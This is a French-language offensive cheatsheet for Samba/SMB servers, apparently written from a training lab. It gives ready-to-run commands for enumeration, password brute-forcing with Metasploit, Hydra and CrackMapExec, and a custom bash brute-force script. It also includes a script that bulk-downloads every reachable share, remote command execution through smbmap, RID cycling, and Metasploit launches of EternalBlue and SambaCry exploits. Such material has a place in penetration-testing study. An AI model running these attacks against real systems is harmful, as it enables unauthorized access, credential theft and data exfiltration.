# Samba Recon - Cheatsheet d'Attaque par Dictionnaire

## Vue d'ensemble
Cette cheatsheet couvre les techniques de reconnaissance et d'exploitation des serveurs Samba/SMB, incluant l'énumération, les attaques par dictionnaire, l'analyse des partages et les techniques d'exploitation avancées.

---

## Phase 1: Reconnaissance et détection

### Test de connectivité
```bash
# Vérification de l'accessibilité
ping -c 4 <target>

# Test de connectivité NetBIOS
nbtscan <target>
```

### Scan des ports SMB/NetBIOS
```bash
# Ports SMB standards
nmap -p 139,445 <target>

# Scan avec détection de version
nmap -sV -p 139,445 <target>

# Scan complet NetBIOS/SMB
nmap -p 137,138,139,445 -sV -sC <target>

# Scripts NSE spécialisés SMB
nmap --script smb* -p 445 <target>
```

### Détection de version Samba
```bash
# Banner grabbing SMB
smbclient -L <target> -N

# Avec enum4linux
enum4linux -S <target>

# Version détaillée avec Metasploit
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run
```

---

## Phase 2: Énumération des partages

### Énumération anonyme
```bash
# Liste des partages sans authentification
smbclient -L <target> -N

# Avec smbmap
smbmap -H <target>

# Connexion anonyme (null session)
smbclient -L <target> -U ""
rpcclient -U "" <target>
```

### Scripts Nmap pour énumération
```bash
# Énumération complète SMB
nmap --script smb-enum-shares,smb-enum-users,smb-enum-domains,smb-enum-groups,smb-enum-services -p 445 <target>

# Test de vulnérabilités
nmap --script smb-vuln* -p 445 <target>

# Énumération spécifique
nmap --script smb-enum-shares -p 445 <target>
nmap --script smb-enum-users -p 445 <target>
```

### Avec enum4linux
```bash
# Énumération basique
enum4linux <target>

# Énumération complète
enum4linux -a <target>

# Énumération avec credentials
enum4linux -u "username" -p "password" -a <target>

# Énumération spécifique des partages
enum4linux -S <target>
```

---

## Phase 3: Attaques par dictionnaire

### Avec Metasploit (Méthode du lab)

#### Configuration pour utilisateur spécifique
```bash
# Comme dans le lab - utilisateur jane
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS <target>
exploit
```

#### Configuration pour attaque complète
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set STOP_ON_SUCCESS false  # Pour trouver tous les comptes
set VERBOSE true
run
```

#### Tests avec différentes wordlists
```bash
# Wordlists Metasploit
set PASS_FILE /usr/share/wordlists/metasploit/common_passwords.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set PASS_FILE /usr/share/wordlists/metasploit/passwords.lst

# Utilisateurs courants
set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
```

### Avec Hydra (Méthode du lab)

#### Préparation de RockYou
```bash
# Décompression de rockyou (comme dans le lab)
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

#### Attaques Hydra
```bash
# Utilisateur spécifique avec RockYou (comme dans le lab)
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> smb

# Wordlists multiples
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/rockyou.txt <target> smb

# Avec limitations de performance
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> smb -t 4 -w 30

# Port personnalisé
hydra -l admin -P passwords.txt <target> -s 445 smb
```

### Avec CrackMapExec
```bash
# Installation si nécessaire
apt-get install crackmapexec

# Utilisateur unique
crackmapexec smb <target> -u admin -p /usr/share/wordlists/rockyou.txt

# Wordlists multiples
crackmapexec smb <target> -u /usr/share/wordlists/metasploit/common_users.txt -p /usr/share/wordlists/metasploit/unix_passwords.txt

# Avec options avancées
crackmapexec smb <target> -u admin -p passwords.txt --shares --continue-on-success
```

### Avec smbclient en script
```bash
#!/bin/bash
# smb_bruteforce.sh

TARGET=$1
USER=$2
PASSLIST=$3

while IFS= read -r password; do
    echo "Testing: $USER:$password"
    smbclient -L $TARGET -U "$USER%$password" -W WORKGROUP 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[SUCCESS] $USER:$password"
        break
    fi
done < "$PASSLIST"
```

---

## Phase 4: Analyse des partages et permissions

### Avec smbmap (Méthode du lab)

#### Analyse des permissions
```bash
# Avec credentials trouvés (comme dans le lab avec admin:password1)
smbmap -H <target> -u admin -p password1

# Analyse détaillée
smbmap -H <target> -u admin -p password1 -R

# Test d'écriture
smbmap -H <target> -u admin -p password1 --upload test.txt 'share_name/test.txt'

# Avec domaine
smbmap -H <target> -u admin -p password1 -d DOMAIN
```

#### Options avancées smbmap
```bash
# Recherche de fichiers spécifiques
smbmap -H <target> -u admin -p password1 -R --depth 5 -A '*.txt'
smbmap -H <target> -u admin -p password1 -R -q -A '*.conf'

# Exécution de commandes
smbmap -H <target> -u admin -p password1 -x 'whoami'
```

### Avec smbclient

#### Test de navigabilité (comme dans le lab)
```bash
# Liste des partages
smbclient -L <target> -U jane
# Password: abc123

# Test d'accès à un partage spécifique
smbclient //<target>/jane -U jane
# Password: abc123

# Navigation dans les partages
smbclient //<target>/admin -U admin
# Password: password1
```

#### Commandes smbclient essentielles
```bash
# Dans une session smbclient
ls                     # Lister les fichiers
cd directory           # Changer de répertoire
get filename           # Télécharger un fichier
mget *.txt            # Télécharger plusieurs fichiers
put filename          # Uploader un fichier
mkdir newdir          # Créer un répertoire
rmdir directory       # Supprimer un répertoire
del filename          # Supprimer un fichier
```

---

## Phase 5: Exploitation avancée et collecte de données

### Collecte de flags/données (Méthode du lab)

#### Navigation et extraction
```bash
# Connexion au partage admin (comme dans le lab)
smbclient //<target>/admin -U admin
# Password: password1

# Navigation et téléchargement
ls
cd hidden
ls
get flag.tar.gz
exit

# Extraction locale
tar -xf flag.tar.gz
cat flag
```

#### Script automatisé pour collecte
```bash
#!/bin/bash
# smb_collector.sh

TARGET=$1
CREDS_FILE=$2  # Format: username:password

while IFS=':' read -r username password; do
    echo "[*] Collecting from $username"
    
    # Créer répertoire pour l'utilisateur
    mkdir -p "smb_loot_$username"
    
    # Liste des partages accessibles
    smbclient -L $TARGET -U "$username%$password" -W WORKGROUP 2>/dev/null | grep "Disk" | awk '{print $1}' > shares_$username.txt
    
    # Télécharger depuis chaque partage
    while IFS= read -r share; do
        echo "[+] Accessing share: $share"
        smbclient //$TARGET/$share -U "$username%$password" -c "prompt OFF; recurse ON; mget *" 2>/dev/null
        mv * "smb_loot_$username/" 2>/dev/null
    done < shares_$username.txt
    
done < "$CREDS_FILE"

# Recherche de flags
find smb_loot_*/ -type f -exec grep -l "flag\|{.*}" {} \; 2>/dev/null
```

---

## Phase 6: Énumération des Named Pipes (Méthode du lab)

### Avec Metasploit pipe_auditor
```bash
# Configuration comme dans le lab
msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS <target>
exploit
```

### Énumération manuelle des pipes
```bash
# Avec smbclient
smbclient //<target>/IPC$ -U admin
# Dans la session:
help

# Avec rpcclient
rpcclient -U admin <target>
# Dans la session:
help
enumdomains
enumdomusers
```

### Named Pipes communes à rechercher
```
netlogon       # Authentification domaine
lsarpc         # Local Security Authority
samr           # Security Account Manager
eventlog       # Logs d'événements
InitShutdown   # Contrôle système
ntsvcs         # Services NT
srvsvc         # Services serveur
wkssvc         # Services workstation
winreg         # Registre Windows
spoolss        # Service d'impression
```

---

## Phase 7: RID Cycling et énumération utilisateurs (Méthode du lab)

### Avec enum4linux
```bash
# RID Cycling comme dans le lab
enum4linux -r -u "admin" -p "password1" <target>

# Énumération complète des utilisateurs
enum4linux -U -u "admin" -p "password1" <target>

# Énumération des groupes
enum4linux -G -u "admin" -p "password1" <target>

# Information sur un utilisateur spécifique
enum4linux -u "admin" -p "password1" -U <target> | grep "jane\|nancy\|shawn\|admin"
```

### Avec rpcclient
```bash
# Connexion
rpcclient -U admin <target>

# Énumération des utilisateurs
enumdomusers
enumdomgroups

# Information sur un utilisateur par RID
queryuser 1000
queryuser 1001
queryuser 1002
queryuser 1003

# Conversion RID vers nom
lookuprids 1000 1001 1002 1003
```

### SID Format typique
```
Format: S-1-22-1-XXXX
Exemples du lab:
shawn: S-1-22-1-1000
jane:  S-1-22-1-1001  
nancy: S-1-22-1-1002
admin: S-1-22-1-1003
```

---

## Phase 8: Vulnérabilités Samba spécifiques

### Tests de vulnérabilités communes
```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 <target>

# CVE-2017-7494 (SambaCry)
nmap --script smb-vuln-cve-2017-7494 -p 445 <target>

# Autres vulnérabilités
nmap --script smb-vuln* -p 445 <target>
```

### Exploitation avec Metasploit
```bash
# MS17-010 EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
exploit

# SambaCry
use exploit/linux/samba/is_known_pipename
set RHOSTS <target>
exploit
```

---